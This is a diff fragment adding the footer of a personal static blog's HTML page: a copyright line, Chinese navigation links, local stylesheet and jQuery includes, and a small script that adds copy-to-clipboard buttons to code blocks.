+    Copyright &copy;
+    
+    
+    2016-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
